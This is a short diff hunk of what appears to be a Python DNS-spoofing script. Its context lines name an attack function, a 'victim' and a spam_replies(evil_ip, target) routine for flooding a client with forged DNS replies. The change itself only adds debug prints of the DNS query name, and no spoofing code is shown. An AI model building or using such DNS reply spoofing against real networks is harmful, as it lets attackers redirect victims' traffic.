@@ -27,10 +27,12 @@ def attack(packet):
 	dns_server = ip_info.dst
 	victim = ip_info.src 
 
-	#Get UDP info
-
 	#Get DNS info
-	#print dns_info.qname
+	print "---------DNS STUFF----------"
+	print dns_info.qd.qname
+	#print dns_info.an 
+	#print dns_info.ns 
+	#print dns_info.ar 
 
 #spam client with DNS replies
 def spam_replies(evil_ip, target):
